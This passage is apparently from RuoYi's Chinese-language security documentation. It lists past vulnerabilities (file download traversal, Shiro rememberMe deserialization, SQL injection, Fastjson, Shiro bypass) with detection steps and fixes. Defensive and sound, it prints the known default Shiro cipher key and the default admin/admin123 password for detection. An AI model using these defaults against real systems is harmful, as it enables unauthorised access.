	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>解决方案：升级<code>RuoYi</code>版本到 <code>&gt;=4.6.2</code>，或者添加示例代码处理，防止注入漏洞。</p> <br> <br> <ul><li>任意文件下载漏洞 <code>RuoYi &lt;= v4.5.0</code></li></ul> <p>任意文件下载漏洞，正常的利用手段是下载服务器文件，如脚本代码，服务器配置或者是系统配置等等。可以利用<code>../</code>来逐层猜测路径。</p> <p>网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。</p> <p>检测漏洞：<code>CommonController.java</code>，<code>/common/download/resource</code>接口是否包含<code>checkAllowDownload</code>用于检查文件是否可下载，如果没有此方法则需要修改，防止被下载关键信息。</p> <p>解决方案：升级<code>RuoYi</code>版本到 <code>&gt;=4.5.1</code>，或者重新添加文件下载检查，防止任意文件下载。</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token comment">/**
 * 本地资源通用下载
 */</span>
<span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">&quot;/common/download/resource&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">resourceDownload</span><span class="token punctuation">(</span><span class="token class-name">String</span> resource<span class="token punctuation">,</span> <span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span>
		<span class="token keyword">throws</span> <span class="token class-name">Exception</span>
<span class="token punctuation">{</span>
	<span class="token keyword">try</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">checkAllowDownload</span><span class="token punctuation">(</span>resource<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">&quot;资源文件({})非法，不允许下载。 &quot;</span><span class="token punctuation">,</span> resource<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token comment">// 本地资源路径</span>
		<span class="token class-name">String</span> localPath <span class="token operator">=</span> <span class="token class-name">Global</span><span class="token punctuation">.</span><span class="token function">getProfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">// 数据库资源地址</span>
		<span class="token class-name">String</span> downloadPath <span class="token operator">=</span> localPath <span class="token operator">+</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">substringAfter</span><span class="token punctuation">(</span>resource<span class="token punctuation">,</span> <span class="token class-name">Constants</span><span class="token punctuation">.</span><span class="token constant">RESOURCE_PREFIX</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">// 下载名称</span>
		<span class="token class-name">String</span> downloadName <span class="token operator">=</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">substringAfterLast</span><span class="token punctuation">(</span>downloadPath<span class="token punctuation">,</span> <span class="token string">&quot;/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		response<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token class-name">MediaType</span><span class="token punctuation">.</span><span class="token constant">APPLICATION_OCTET_STREAM_VALUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">setAttachmentResponseHeader</span><span class="token punctuation">(</span>response<span class="token punctuation">,</span> downloadName<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">writeBytes</span><span class="token punctuation">(</span>downloadPath<span class="token punctuation">,</span> response<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">&quot;下载文件失败&quot;</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">/**
 * 检查文件是否可下载
 * 
 * @param resource 需要下载的文件
 * @return true 正常 false 非法
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">checkAllowDownload</span><span class="token punctuation">(</span><span class="token class-name">String</span> resource<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token comment">// 禁止目录上跳级别</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>resource<span class="token punctuation">,</span> <span class="token string">&quot;..&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// 检查允许下载的文件规则</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">ArrayUtils</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token class-name">MimeTypeUtils</span><span class="token punctuation">.</span><span class="token constant">DEFAULT_ALLOWED_EXTENSION</span><span class="token punctuation">,</span> <span class="token class-name">FileTypeUtils</span><span class="token punctuation">.</span><span class="token function">getFileType</span><span class="token punctuation">(</span>resource<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// 不在允许下载的文件规则</span>
	<span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br></div></div><br> <br> <ul><li>Spring Framework反射型文件下载漏洞 <code>RuoYi &lt; v4.5.0</code></li></ul> <p>VMware Tanzu发布安全公告，在Spring Framework版本5.2.0-5.2.8、5.1.0-5.1.17、5.0.0-5.0.18、4.3.0-4.3.28和较旧的不受支持的版本中，公布了一个存在于Spring Framework中的反射型文件下载（Reflected File Download,RFD）漏洞（CVE-2020-5421）。</p> <p>CVE-2020-5421漏洞可通过jsessionid路径参数，绕过防御RFD攻击的保护。攻击者通过向用户发送带有批处理脚本扩展名的URL，使用户下载并执行文件，从而危害系统。VMware Tanzu官方已发布修复漏洞的新版本。</p> <p>解决方案：升级<code>spring-boot-starter</code>版本到 <code>&gt;=2.1.17</code>。</p> <br> <br> <ul><li>Shiro阻止权限绕过漏洞 <code>RuoYi &lt; v4.4.0</code></li></ul> <p>Shiro &lt; 1.6.0 版本存在一处权限绕过漏洞，由于 <code>shiro</code> 在处理 <code>url</code> 时与 <code>spring</code> 存在差异，处理身份验证请求时出错导致依然存在身份校验绕过漏洞，远程攻击者可以发送特制的 HTTP 请求，绕过身份验证过程并获得对应用程序的未授权访问。</p> <p>检测漏洞：<code>pom.xml</code> <code>Shiro &lt; 1.6.0</code> 则版本存在漏洞。</p> <p>解决方案：升级版本到 <code>&gt;=1.6.0</code>。</p> <br> <br> <ul><li>命令执行漏洞 <code>RuoYi &lt;= v4.3.0</code></li></ul> <p>若依管理系统使用了Apache Shiro，Shiro 提供了记住我（RememberMe）的功能，下次访问时无需再登录即可访问。系统将密钥硬编码在代码里，且在官方文档中并没有强调修改该密钥，导致框架使用者大多数都使用了默认密钥。攻击者可以构造一个恶意的对象，并且对其序列化、AES加密、base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞，进而在目标机器上执行任意命令。</p> <p>检测漏洞：<code>ShiroConfig.java</code> 是否包含 <code>fCq+/xW488hMTCD+cmJ3aQ==</code>，如果是使用的默认密钥则需要修改，防止被执行命令攻击。</p> <p>解决方案：升级版本到 <code>&gt;=v.4.3.1</code>，并且重新生成一个新的秘钥替换<code>cipherKey</code>，保证唯一且不要泄漏。</p> <div class="language-yml line-numbers-mode"><pre class="language-yml"><code><span class="token comment"># Shiro</span>
<span class="token key atrule">shiro</span><span class="token punctuation">:</span>
  <span class="token key atrule">cookie</span><span class="token punctuation">:</span>
    <span class="token comment"># 设置密钥，务必保持唯一性（生成方式，直接拷贝到main运行即可）KeyGenerator keygen = KeyGenerator.getInstance(&quot;AES&quot;); SecretKey deskey = keygen.generateKey(); System.out.println(Base64.encodeToString(deskey.getEncoded()));</span>
    <span class="token key atrule">cipherKey</span><span class="token punctuation">:</span> zSyK5Kp6PZAAjlT+eeNMlg==
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token comment">// 直接拷贝到main运行即可生成一个Base64唯一字符串</span>
<span class="token class-name">KeyGenerator</span> keygen <span class="token operator">=</span> <span class="token class-name">KeyGenerator</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">&quot;AES&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">SecretKey</span> deskey <span class="token operator">=</span> keygen<span class="token punctuation">.</span><span class="token function">generateKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>deskey<span class="token punctuation">.</span><span class="token function">getEncoded</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><br> <br> <ul><li>SQL注入攻击 <code>RuoYi &lt;= v3.2.0</code></li></ul> <p>若依管理系统使用了PageHelper，PageHelper提供了排序（Order by）的功能，前端直接传参完成排序。系统没有做字符检查，导致存在被注入的风险，最终造成数据库中存储的隐私信息全部泄漏。</p> <p>检测漏洞：<code>BaseController.java</code> 是否包含 <code>String orderBy = pageDomain.getOrderBy();</code>，如果没有字符检查需要修改，防止被执行注入攻击。</p> <p>解决方案：升级版本到 <code>&gt;=v.3.2.0</code>，或者重新添加字符检查<code>String orderBy = SqlUtil.escapeOrderBySql(pageDomain.getOrderBy());</code>，防止注入绕过。</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>sql</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>exception<span class="token punctuation">.</span>base<span class="token punctuation">.</span></span><span class="token class-name">BaseException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">StringUtils</span></span><span class="token punctuation">;</span>

<span class="token comment">/**
 * sql操作工具类
 * 
 * @author ruoyi
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SqlUtil</span>
<span class="token punctuation">{</span>
    <span class="token comment">/**
     * 仅支持字母、数字、下划线、空格、逗号、小数点（支持多个字段排序）
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token constant">SQL_PATTERN</span> <span class="token operator">=</span> <span class="token string">&quot;[a-zA-Z0-9_\\ \\,\\.]+&quot;</span><span class="token punctuation">;</span>

    <span class="token comment">/**
     * 检查字符，防止注入绕过
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">escapeOrderBySql</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isNotEmpty</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isValidOrderBySql</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BaseException</span><span class="token punctuation">(</span><span class="token string">&quot;参数不符合规范，不能进行查询&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 验证 order by 语法是否符合规范
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isValidOrderBySql</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> value<span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token constant">SQL_PATTERN</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br></div></div><br> <br> <ul><li>Shiro阻止权限绕过漏洞 <code>RuoYi &lt;= v4.3.0</code></li></ul> <p>Shiro &lt; 1.5.2 版本存在一处权限绕过漏洞，当受影响版本的Shiro框架结合Spring dynamic controllers使用时，未经授权的远程攻击者可以通过精心构造的请求包进行权限绕过，可能造成鉴权系统失效以及后台功能暴露。</p> <p>检测漏洞：<code>pom.xml</code> <code>Shiro &lt;=1.5.2</code> 则版本存在漏洞。</p> <p>解决方案：升级版本到 <code>&gt;=1.5.3</code>。</p> <br> <br> <ul><li>Fastjson高危漏洞 <code>RuoYi &lt;= v4.2.0</code></li></ul> <p>Fastjson &lt; 1.2.68 版本存在一处反序列化漏洞，主要为autoType开关绕过的反序列化漏洞利用，恶意攻击者可以通过该漏洞绕过autoType限制实现远程代码执行攻击，从而获取目标系统管理权限，建议尽快更新漏洞修复版本或采用临时缓解措施加固系统。</p> <p>检测漏洞：<code>pom.xml</code> <code>Fastjson &lt;=1.2.68</code> 则版本存在漏洞。</p> <p>解决方案：升级版本到 <code>&gt;=1.2.70</code>。</p> <div class="custom-block warning"><p class="custom-block-title">注意</p> <p>若依平台的默认口令 admin/admin123，请大家在线上环境一定要修改超级管理员的密码。<br> <code>SysPasswordService.encryptPassword(String username, String password, String salt)</code><br>
直接到main运行此方法，填充账号密码及盐（保证唯一），生成md5加密字符串。</p></div></div> <footer class="page-edit"><!----> <!----></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/ruoyi-doc/ruoyi/" class="prev router-link-active">
        介绍
      </a></span> <span class="next"><a href="/ruoyi-doc/ruoyi/document/hjbs.html">
        环境部署
      </a>
      →
    </span></p></div> </main></div><div class="global-ui"></div></div>
    <script src="/ruoyi-doc/assets/js/app.5798b861.js" defer></script><script src="/ruoyi-doc/assets/js/2.f516d180.js" defer></script><script src="/ruoyi-doc/assets/js/52.cd359cac.js" defer></script>
  </body>
</html>
